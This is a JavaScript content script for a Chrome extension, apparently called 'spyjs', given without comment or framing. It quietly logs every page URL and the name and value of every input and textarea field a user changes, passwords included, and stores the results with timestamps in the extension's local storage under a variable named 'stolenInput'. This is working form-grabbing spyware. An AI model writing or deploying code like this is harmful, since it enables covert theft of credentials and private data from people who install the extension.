var debug = 1;


var currLoc = location.href;
if(debug){
	console.log("("+currLoc+")");
}
spyjs_saveData("("+currLoc+")");
var inputs = document.querySelectorAll('input');
for(var i = 0; i < inputs.length; i++) {
	inputs[i].addEventListener("change", function(e) {spyjs_getInput(e.currentTarget)});
}
var textareas = document.getElementsByTagName('textarea');
for(var i = 0; i < textareas.length; i++) {
	textareas[i].addEventListener("change", function(e) {spyjs_getInput(e.currentTarget)});
}
if(debug){
	document.addEventListener("click", function(e) {chrome.storage.local.get(null, function (result) {
		console.log(result);
	});});
}


function spyjs_getInput(inputInfo){
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		if(debug){
			console.log(name+"="+value);
		}
		spyjs_saveData("("+currLoc+")("+name+"=>"+value+")");
	}
}

function spyjs_saveData(data){
	var timestamp = new Date().getTime();
	var obj = {};
	obj[timestamp] = data;
	chrome.storage.local.set(obj);
}

